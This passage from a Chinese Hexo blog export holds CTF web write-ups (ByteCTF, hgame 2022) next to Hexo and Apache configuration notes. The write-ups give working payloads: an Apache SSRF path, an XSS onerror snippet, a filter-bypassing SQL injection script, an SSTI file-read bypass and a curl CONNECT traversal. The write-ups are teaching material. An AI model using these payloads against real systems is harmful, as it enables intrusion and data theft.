<p>如果你要在其他地方布置项目的话，恐怕需要修改GOPATH，而GOPATH是一个全局变量，换过来之后又要改回去，更加显得愚蠢。。。</p>
<p>而go在1.11版本后支持了全新的操作，go mod（module），可以进行类似包管理器的操作了，允许你直接引用<code>GOPATH/pkt</code>下面的第三方库，创建一个go.mod文件来记录依赖内容，并用一个go.sum文件保存checksum。这样子就能把项目创建在任何地方，而GOPATH也就是一个简单的第三方库路径而已了，早就应该这样子啊，这样子不才是比较合理的做法吗？？？</p>
<p>有的地方经常推荐把GOPATH&#x2F;bin加入到PATH中，我暂时不想这么做。。。加入PATH并不会对编译项目有所帮助，只是单纯的go版本更新也是把go下载到GOPATH下面，为什么会有人这么设计。。。以及可能还会有一些下下来就能用的二进制软件。<br>还有一件事，GOPATH默认为什么是在<code>$HOME/go</code>下？我并不是很喜欢把一堆东西放在家目录下，所以我还手动改了下go的家目录，丢到<code>/usr/local/lib</code>下面了，希望这个名字符合他的功能</p>
<p>另一个需要1.13版本的原因在于golang的一些依赖包，比如golang.org被墙了（为什么要墙这个。。。）然后go在1.13版本下才推出了一个代理功能，GOPROXY，使用这个就可以透明的指定国内的代理，指定完了就不用再管了，比较方便，不然你直接用go mod download还是用go get也好，都下不下来依赖</p>
<p>反正，只要你的go版本大于1.13,，先<code>go env -w GOPROXY=https://goproxy.cn,direct</code>指定用国内镜像，然后<code>go mod download</code>一把梭下下来全部依赖，<code>go build main.go</code>，直接编译成功并能运行，我哭了</p>
<p>总而言之，现代版go还是比较好用的，能直接一键安装依赖，做到拆包即用，老版本golang可真是反人类啊，我一开始用这Ubuntu自带的1.6人都用麻了</p>
<h3 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://blog.deteact.com/yandex-clickhouse-injection/">Yandex.ClickHouse injection</a></p>
<h2 id="proxy"><a href="#proxy" class="headerlink" title="proxy"></a>proxy</h2><p>这个题是否有些玄幻？</p>
<p>对外暴露的80端口开了一个Apache的代理，只能代理到一个http服务，http服务里面锤子没有，就一个index.html<br>内网还有一个python服务，但是Apache并不不能代理这个地址，且其不能直接出网，接受一个post提交的url，通过访问Apache的8123端口提供的代理服务出网访问url，根据dockerfile显示，代理服务用的basic认证方式，认证密码即为flag</p>
<p>用前段时间的那个Apache ssrf的洞，用<code>/?unix:A*4100|http://internal/fetch</code>去访问，POST提交数据就和正常报文一致</p>
<p>在requirement.txt中特别指出了<code>requests==2.25.1</code>，查了一下，最新版本是2.26.0，就是该版本后的一个版本，但去GitHub简单对比了一下，好像没有看到什么和代理有关的安全问题更新，唯一一个和proxy有关的更新是在session下某些操作导致凭证不发送相关的问题。似乎没用</p>
<p>搜索历史漏洞，在2.20之前存在一个访问https被重定向到http情况下，requests会将凭证携带上再次发送的问题，这个的漏洞点在于http明文传输，可能会被监听网卡之类的方法嗅探，也不是这里能用的</p>
<p>题解也比较玄幻，我暂未理解原理。先让目标站点访问一个重定向网页，使其使用https访问我们可控的一个站点，那么这次重定向请求中就会携带上Proxy-Authorization头，因为authorization类型是basic，直接base64解码即可拿到内容（什么原理）</p>
<p>当proxy遇到一个302的时候，应该不是proxy继续跟随重定向，而是把重定向结果返回给requests，然后requests再发送第二个请求出去。requests重新发送的https请求和直接访问https站点发送的请求又有什么不同呢？为什么一定得是https协议重定向才会生效呢？读python源码吗，读不动了。。。</p>
<p><code>read_the_source_code_to:ByteCTF&#123;Explo1t_1dAy_4nD_haV3_FuN&#125;</code></p>
<h2 id="Aginx2"><a href="#Aginx2" class="headerlink" title="Aginx2"></a>Aginx2</h2><p>初赛出过的题目的加强版<br>初赛那个题我就没看懂，不过我对它用的是http2存在一定的印象</p>
<p>简单的说就是有这么一个场景，前端有一个负载均衡服务器，后端是实际服务器，而客户端和前端沟通使用的是http2，而前端和后端沟通的时候又换回了http1.1，就会出现各种各样的请求夹带</p>
<p>按理说如果前端和后端对应每个来自客户的连接都维护一个单独的连接的话，即使发生请求夹带也不会对不同用户产生影响，但当并发量非常大时这并不现实。同时，系统的端口数量恐怕也不支持进行这样的操作，并且tcp连接的三次握手和四次挥手在高并发情况下反复建了拆拆了建会导致极大的资源消耗。因此，通常采用的是一种被称为连接池的技术</p>
<p>连接池，简单的说，就是前段和后端服务器维护一个数量为n的tcp连接，这个连接是长连接，当前端收到客户端的请求时，就从连接池中拿一个空闲的连接和后端进行交互，交互完了又把这个连接塞回连接池中，这样子就去除了每个请求都要进行tcp建立的开销</p>
<p>但这样子也就复用了tcp连接，也会导致请求夹带的威胁出现。假设用户A发送了一个请求，但这个请求里面夹带了两个请求，前端认为只发出了一个请求，而后端则认为收到了两个请求，这样子用户A就会拿到自己发出的第一个请求的应答。<br>而这时用户B也发起了一个请求，并且前后端沟通的连接就是之前A发出夹带请求的连接，用户A发出的夹带请求就拼在了用户B请求的前面，可以通过一定的构造，使得用户B的正常请求被吞掉部分，但不影响后端对用户的辨识（xff头之类的），使得用户B发出的请求实际上变成了A夹带的请求，并接收到恶意的结果</p>
<p>如果使用每个用户维护一个单独连接应该就不会出现上述情况，因为一个连接上只存在一个用户，那么夹带的请求只是会另该用户的下一个请求拿到夹带请求的结果，而不会对其他用户造成威胁</p>
<p>至于如何在http2降级到http1.1时进行请求夹带，可以看这个black hat的这个议题<br><a href="https://i.blackhat.com/EU-21/Wednesday/EU-21-Kettle-HTTP-The-Sequel-Is-Always-Worse.pdf">HTTP2-The-Sequel-Is-Always-Worse</a></p>
]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>SSTI</tag>
        <tag>SQLI</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo编码问题</title>
    <url>/hexo%E7%BC%96%E7%A0%81%E9%97%AE%E9%A2%98.html</url>
    <content><![CDATA[<h1 id="hexo编码问题"><a href="#hexo编码问题" class="headerlink" title="hexo编码问题"></a>hexo编码问题</h1><p>最近重拾起刷题，又需要重新推一下博客，遇到了之前遇到过但是没有解决的问题，今天重新花时间整理了一下，大致解决了问题<br>但是经过一次全部的重构之后</p>
<h2 id="title处不能使用特殊字符"><a href="#title处不能使用特殊字符" class="headerlink" title="title处不能使用特殊字符"></a>title处不能使用特殊字符</h2><p>该问题可以通过html编码解决，将[]替换为html编码<code>&amp;#91</code>和<code>&amp;#93</code>即可，但是出现了一些衍生错误，标题中不能使用空格，否则标题可能会缺一部分，使用下划线替代空格之后显示的又是空格，暂时不清楚怎么回事</p>
<p>找到另一个替代方法，将title用单引号包裹起来即可，展示时不会出现单引号，较为方便，在标题不出现单引号的情况下用单引号包裹title可以保证其他特殊字符不出现解析错误</p>
<h2 id="文章内不能出现或"><a href="#文章内不能出现或" class="headerlink" title="文章内不能出现或"></a>文章内不能出现{% %}或{{}}</h2><p>如上两个标记会被hexo引擎解析错误，每次在写和ssti相关文章时必报该错，目前只有一个较为愚蠢的解决方案。使用对应的标记对{% raw %}{% endraw %}来包裹可能出问题的内容，但不能随意使用该对，hexo会将这两个标记中的所有字符均视为普通字符，包裹内容过大会导致文章代码高亮等语法无效</p>
<h2 id="在代码段中使用反引号"><a href="#在代码段中使用反引号" class="headerlink" title="在代码段中使用反引号"></a>在代码段中使用反引号</h2><p>之前遇到这个问题的时候都没有考虑，今天update一下，只要在外围的反引号数多于代码块中的反引号数量就可以了<br><code>print `whoami`;</code>这一段实际上是``print `whoami`;``<br>如果需要用连着的两个反引号，就在外层是连着的三个反引号就行了<br>看的这个大哥的文章<br><a href="https://hui-shao.cn/hexo-code-block/">在代码块中使用反引号(代码块开始标记)的方法</a></p>
<h2 id="贴一个自己写的hexo头部自动格式化脚本"><a href="#贴一个自己写的hexo头部自动格式化脚本" class="headerlink" title="贴一个自己写的hexo头部自动格式化脚本"></a>贴一个自己写的hexo头部自动格式化脚本</h2><p>辣鸡脚本，勉强能用就行</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> os
<span class="token keyword">import</span> re
<span class="token keyword">import</span> time
<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np
<span class="token keyword">from</span> random <span class="token keyword">import</span> randrange


header <span class="token operator">=</span> <span class="token triple-quoted-string string">'''---
title: {0}
date: {1}
tags:
- 
categories: 
img: /img/{2}
---

'''</span>
dir <span class="token operator">=</span> <span class="token string">"D:/blog/source/_posts/"</span>
img_path <span class="token operator">=</span> <span class="token string">"D:/blog/themes/hexo-theme-matery/source/img/"</span>
files <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>dir<span class="token punctuation">)</span>
file_cnt <span class="token operator">=</span> len<span class="token punctuation">(</span>files<span class="token punctuation">)</span>
modify_cnt <span class="token operator">=</span> <span class="token number">0</span>

<span class="token keyword">if</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span><span class="token string">"log.npy"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    modified_files <span class="token operator">=</span> np<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token string">'log.npy'</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    modified_files <span class="token operator">=</span> np<span class="token punctuation">.</span>array<span class="token punctuation">(</span><span class="token string">'example.md'</span><span class="token punctuation">)</span>

<span class="token keyword">for</span> file <span class="token keyword">in</span> files<span class="token punctuation">:</span>
    <span class="token keyword">if</span> file<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">".md"</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> file <span class="token operator">not</span> <span class="token keyword">in</span> modified_files<span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[+]"</span> <span class="token operator">+</span> file<span class="token punctuation">)</span>
            file_path <span class="token operator">=</span> dir <span class="token operator">+</span> file
            <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'UTF-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                line <span class="token operator">=</span> f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>
                f<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
                result <span class="token operator">=</span> <span class="token string">""</span>
                content <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 读取整个文件</span>
                <span class="token keyword">if</span> line <span class="token operator">!=</span> <span class="token string">"---\n"</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 未处理头部</span>
                    title <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">"(# )|\n"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token string">"'"</span> <span class="token operator">+</span> line <span class="token operator">+</span> <span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                    ctime <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>getctime<span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建时间</span>
                    date <span class="token operator">=</span> time<span class="token punctuation">.</span>strftime<span class="token punctuation">(</span><span class="token string">'%Y-%m-%d %H:%M:%S'</span><span class="token punctuation">,</span> time<span class="token punctuation">.</span>localtime<span class="token punctuation">(</span>ctime<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    img_list <span class="token operator">=</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span>img_path<span class="token punctuation">)</span>
                    index <span class="token operator">=</span> randrange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>img_list<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    img <span class="token operator">=</span> img_list<span class="token punctuation">[</span>index<span class="token punctuation">]</span>   <span class="token comment" spellcheck="true"># 随机一个封面图片</span>
                    result <span class="token operator">=</span> header<span class="token punctuation">.</span>format<span class="token punctuation">(</span>title<span class="token punctuation">,</span> date<span class="token punctuation">,</span> img<span class="token punctuation">)</span>
                <span class="token comment" spellcheck="true"># 编码可能出错的字符，重写整个文件</span>
                f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">with</span> open<span class="token punctuation">(</span>file_path<span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"UTF-8"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
                    content <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">+</span> content<span class="token punctuation">)</span>
                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>content<span class="token punctuation">)</span>
                    f<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
                    modify_cnt <span class="token operator">+=</span> <span class="token number">1</span>
                    modified_files <span class="token operator">=</span> np<span class="token punctuation">.</span>append<span class="token punctuation">(</span>modified_files<span class="token punctuation">,</span> file<span class="token punctuation">)</span>
np<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'log.npy'</span><span class="token punctuation">,</span> modified_files<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>str<span class="token punctuation">(</span>modify_cnt<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" file(s) modified, "</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>file_cnt<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" file(s) total."</span><span class="token punctuation">)</span>
</code></pre>
]]></content>
      <categories>
        <category>杂项</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>hgame 2022 web</title>
    <url>/hgame2022.html</url>
    <content><![CDATA[<h1 id="hgame-2022-web"><a href="#hgame-2022-web" class="headerlink" title="hgame 2022 web"></a>hgame 2022 web</h1><p>带着大一萌新一起看题，边做边记录一下，整体坐下来感觉并不是特别好呢。。。感觉比较坑的题占了一小半的数量。。。不过蹭别人的题就不要再逼逼赖赖了</p>
<h2 id="week1"><a href="#week1" class="headerlink" title="week1"></a>week1</h2><h3 id="ezauth"><a href="#ezauth" class="headerlink" title="ezauth"></a>ezauth</h3><p>先试试jwt cracker，然后Ubuntu16.04的openssl的版本是1.0.2，有点古老<br>编译起来之后运行报错，翻下代码能发现是<code>EVP_get_digestbyname</code>这个函数似乎有问题，搜索一下大概是这个原因<br><a href="https://github.com/openssl/openssl/issues/6390">https://github.com/openssl/openssl/issues/6390</a></p>
<p>既然如此就手动更新一下openssl到1.1.1m，也跑不起来。。。恐怕是手动安装的不完善？然后尝试主动调用<code>OpenSSL_add_all_algorithms</code>也报错，懒得深究了，事实证明Ubuntu16.04也许快被时代淘汰了，换到18.04后自带的1.1.1l的openssl就没有问题<br>docker启动。。。<br>docker还卡的要死，用的alpine，得手动apk换源<br>跑了几分钟无果，看起来不是爆破密钥</p>
<p>空密钥，jwt.io改了直接过，脑溢血脑溢血</p>
<h3 id="蛛蛛"><a href="#蛛蛛" class="headerlink" title="蛛蛛"></a>蛛蛛</h3><p>观察一下页面就知道每轮只有一个href有内容，匹配一下一路跟进就行了，key目测是随机生成的，防止猜出来key的规律吧？<br>写个简单脚本就能追到，最后的flag在header里</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests
<span class="token keyword">import</span> re

url <span class="token operator">=</span> <span class="token string">"https://hgame-spider.vidar.club/dfc224a39d"</span>

pattern <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span><span class="token string">"&lt;a href=\"(\?key=.*?)\">"</span><span class="token punctuation">)</span>
href <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>href<span class="token punctuation">)</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        href <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span> res<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token punctuation">.</span>groups<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>href<span class="token punctuation">)</span>
    <span class="token keyword">except</span> AttributeError<span class="token punctuation">:</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
        <span class="token keyword">break</span>
</code></pre>
<h3 id="tetris-plus"><a href="#tetris-plus" class="headerlink" title="tetris plus"></a>tetris plus</h3><p>前端题，给的是HTML就猜出来一半了，开控制台看source里面的js，幸好没加混淆，那个叫check.js的看起来就很像是对比分数的地方，一翻就翻到了5k分的判断语句（翻不到也可以把代码下下来全局搜索，一样的），然后是一个base64的内容，解码出来是flag不在这，但下面有一行注释，看得出来是jsfuck。</p>
<p>其实也就是js代码，直接复制粘贴在控制台里执行就输出flag了</p>
<h3 id="fujiwara-tofu-shop"><a href="#fujiwara-tofu-shop" class="headerlink" title="fujiwara tofu shop"></a>fujiwara tofu shop</h3><p>经典http header，但是有点脑洞。</p>
<h2 id="week2"><a href="#week2" class="headerlink" title="week2"></a>week2</h2><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache!"></a>Apache!</h3><p>看描述就能猜出来是Apache的mod_proxy的ssrf，给了一堆配置文件，找到&#x2F;proxy路由是Apache代理的路由，然后payload复制粘贴打通</p>
<p>比较坑的一点是内网的机子似乎不太稳定，一开始打了好几下没打通，一顿狂打才通了一次</p>
<h3 id="webpack-engine"><a href="#webpack-engine" class="headerlink" title="webpack-engine"></a>webpack-engine</h3><p>理论上来说webpack会超级混淆前端代码使人无法理解，但如果有source map就能还原，然而这里给了sourcemap，理论上来说这是部署错误导致的，可以从sourcemap中还原出原代码。这里base64解一下就有了</p>
<h3 id="At0m的留言板"><a href="#At0m的留言板" class="headerlink" title="At0m的留言板"></a>At0m的留言板</h3><p>点名批评出题人，强行引流关注公众号<br>就是一个过滤了script标签的xss，一开始没有看见在script里定义的有flag，还以为是个ssti，简单打了两下没反应才看见</p>
<p>再次点名批评，给的模板中代码写的flag的名字就是flag，打了半天没反应，我还以为打不了，最后老国王提出用img的alt属性来进行回显，发现使用变量时都不会有效，而在不同标签下定义的变量应该是互通的，就感觉不对劲了，最后直接读标签内容才发现出题人flag的名字还藏了一手，恶心人是吧<br><code>&lt;img onerror=&quot;let a=document.getElementsByTagName(&#39;script&#39;)[0].text;this.alt=a&quot; src=&quot;http://aa/&quot; alt=0&gt;</code></p>
<h3 id="Pokemon"><a href="#Pokemon" class="headerlink" title="Pokemon"></a>Pokemon</h3><p>一SQL注入，替换关键字为空，有回显和部分报错。从error.php那个code那里注的。。。<br>宝可梦选择那不知道能不能注，没测<br>因为有部分报错就能看出来是替换关键字为空，双写即可。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> <span class="token string">"http://121.43.141.153:60056/error.php"</span>
payload <span class="token operator">=</span> <span class="token string">"1 union select group_concat(table_name),2 from information_schema.tables where table_schema = database()"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"1 union select group_concat(column_name),2 from information_schema.columns where table_name = 'fllllllllaaaaaag'"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> <span class="token string">"1 union select flag,2 from fllllllllaaaaaag"</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span><span class="token string">"\t"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"union"</span><span class="token punctuation">,</span> <span class="token string">"uniunionon"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"select"</span><span class="token punctuation">,</span> <span class="token string">"seleselectct"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"or"</span><span class="token punctuation">,</span> <span class="token string">"oorr"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">,</span> <span class="token string">"frfromom"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"where"</span><span class="token punctuation">,</span> <span class="token string">"whewherere"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"="</span><span class="token punctuation">,</span><span class="token string">"like"</span><span class="token punctuation">)</span>
res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">.</span>text<span class="token punctuation">)</span>
</code></pre>
<h3 id="一本单词书"><a href="#一本单词书" class="headerlink" title="一本单词书"></a>一本单词书</h3><p>本周唯一有意思一点的题目，就是个反序列化逃逸<br>思路也不是很复杂，因为反序列化是通过<code>|</code>进行分割的，只需要构造一下字符串逃逸出来即可。用脑袋想可能不是很容易想出来，把代码魔改一下对着输出改就会简单很多<br>（这里我忘记序列化最后有一个分号导致多调试了几分钟）</p>
<h2 id="week3"><a href="#week3" class="headerlink" title="week3"></a>week3</h2><p>只有两个题了？</p>
<h3 id="SecurityCenter"><a href="#SecurityCenter" class="headerlink" title="SecurityCenter"></a>SecurityCenter</h3><p>前端源码里面有hint，打开一看意思就是用的twig模板渲染，然后直接复制粘贴一个payload就能打通<br>似乎进行了cat的过滤，也不允许回显有hgame。随便写点破烂绕过。例如<code>head /fl*|base64</code></p>
<h3 id="Vidar-shop-demo"><a href="#Vidar-shop-demo" class="headerlink" title="Vidar shop demo"></a>Vidar shop demo</h3><p>vue写的前后端分离</p>
<p>感觉有点像条件竞争？<br>在创建订单和支付订单的时候有几个似乎没有用的参数<br>取消订单的时候会退钱。有一种想法是开了个号用一个号给另一个付钱，然后试试能不能退回来，结果发现不能给其他人付款。那就试试退钱的时候能不能竞争一下退两份钱</p>
<p>果然，写了个非常破烂的脚本都能竞争起来。。。<br>还是想办法写一个牛逼一点的竞争脚本吧。。。</p>
<p>说起来强有力的新生@黎明余光同学发现了一个非预期，在前端翻接口翻到了一个<code>/api/pay/callback</code>。然后对着这个接口发一个订单号就能直接把这个订单变成已支付状态。第一反应官方后门？<br>出题方的解释是该接口忘记做权限限制了，但从安全的角度考虑这段代码的意义非常不明。如果是用于在支付成功后服务端访问该接口进行订单状态修改，那为什么不直接把这段逻辑塞到对应位置而是多写一个API呢？</p>
<p>后来学弟和我说他们这个是从哪抄的代码套用的。。。我就知道，然后学弟发现了另一个非预期，申请的订单不支付也能直接通过API取消，取消了也退钱。。。</p>
<p>以及这里的竞争是竞争付款。不是退款。在付款处sleep了0.5s，导致用手点都能竞争成功</p>
<h3 id="还有个啥SQLite注入题，后来上的没看"><a href="#还有个啥SQLite注入题，后来上的没看" class="headerlink" title="还有个啥SQLite注入题，后来上的没看"></a>还有个啥SQLite注入题，后来上的没看</h3><h2 id="week4"><a href="#week4" class="headerlink" title="week4"></a>week4</h2><p>赛题质量再次变得玄幻？感觉出题人有点技穷了</p>
<h3 id="Markdown-Online"><a href="#Markdown-Online" class="headerlink" title="Markdown Online"></a>Markdown Online</h3><p>看起来像原型链污染，仔细看一下又感觉不像</p>
<p>先绕过登录，登录这里是利用try catch直接过检测登进去，理论上来说try catch应该直接返回个报错退出的，这里啥都没做，那就只要进了catch检测无所谓了，因为没看见用express的经典json解析，想着整一个数组试试，结果直接提示用json，那我就不客气了。仔细一看才发现是自己写了个json解析</p>
<p>看起来有一个究极原型链污染的点<code>deap.merge(&#123;&#125;, JSON.parse(buffer.toString()))</code>，并且这个地方是自己实现的json解析，看起来就很有洞。结果跟进去这个deap库一看，遍历用的Object.keys，那就没打头了。并且搜索这个库也没有发现原型链污染相关的漏洞。</p>
<p>然后就是看后面的zombie，这个rce是祥云杯出过的，见过，但是说起来好像不是很好搜。。。这里就是加了点过滤，不给用加号用String.concat绕过即可。（这里用的祥云杯上找的老payload，有点长，学弟直接用的eval。。。方便多了，没注意看）</p>
<p>但是这里又出现了各种无法理解的坑，比如本地通了远程不通之类的。然后搭了个docker，本地docker通了远程不通。最后问了下学弟发现他用的execSync就能通，我用的spawnSync就不能通。sleep延时成功了，但是不知道机器通不通外网，同样的本地机器通了，远程机器shell弹不出来。总不能让我盲注读flag吧。没那个耐心，告辞</p>
<h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>看起来是个xxe，有一堆过滤，但最后拿flag的条件很简单。实体编码就直接过了。。。flag给了个提示好像要我用什么奇怪的协议？没仔细看</p>
<h3 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h3><p>这个题单出出来难度-&gt;正无穷。不过对于赛棍而言就是秒杀了。。。因为这个题是有一个国际赛上出的。我看这个题差不多出了30个人。。。但是我印象里国际赛的时候解题人数应该不会比现在多。希望是大家的搜索能力有所提升。说起来这搜我也感觉不是很好搜来着。我自己都找不到是哪场比赛里出现的了</p>
<p>并且对于萌新而言这个题目太抽象了。萌新能看懂发生了什么吗？<br>起了一个文件服务器，然后把flag文件整了个对应的路由，这样子访问那个路径就是访问对应的路由了，从而拿不到flag<br>以及最后听的端口是8889，但我实际访问的是80。真就整个nginx反带一堆？真有耐心啊<br><code>curl --path-as-is -X CONNECT http://db907b5a72.filesystem.hgame.homeboyc.cn/./there_may_be_a_flag</code><br>实际打法就是那个比赛的payload，直接connect方法打通<br><a href="https://book.hacktricks.xyz/pentesting/pentesting-web/golang">https://book.hacktricks.xyz/pentesting/pentesting-web/golang</a></p>
<p>说起来到底是哪场比赛来着。。。</p>
]]></content>
  </entry>
  <entry>
    <title>Apache配置HTTPS</title>
    <url>/https%E9%85%8D%E7%BD%AE.html</url>
    <content><![CDATA[<h1 id="Apache配置HTTPS"><a href="#Apache配置HTTPS" class="headerlink" title="Apache配置HTTPS"></a>Apache配置HTTPS</h1><p>总算是等到了管局审核结束，我可爱的网站终于可以开张了，在配置完了HTTPS之后，我发现了一个很不爽的问题，居然直接输入域名访问是默认以http形式访问的，而且还访问的上<br>也就是说我辛辛苦苦申请的在Chrome上的小锁没了，这显然不行，于是就开始了我与Apache的斗争。。。。</p>
<h2 id="000-default-conf-amp-default-ssl-conf"><a href="#000-default-conf-amp-default-ssl-conf" class="headerlink" title="000-default.conf&amp;default-ssl.conf"></a>000-default.conf&amp;default-ssl.conf</h2><p>大部分网上的说法都是加htaccess，不是很想维护搞这么多花的，所以最后研究了一下怎么直接修改配置文件从根源解决</p>
<p>各操作系统和各版本Apache配置文件名字都不一样，我的Ubuntu16上的这版叫标题这两个名字，在&#x2F;etc&#x2F;apache&#x2F;site-avaliable目录下<br>一开始只改了site-avaliable下面的000-default.conf，把Virtual host的端口直接改成443，然后在Directory标签里面加上这堆规则</p>
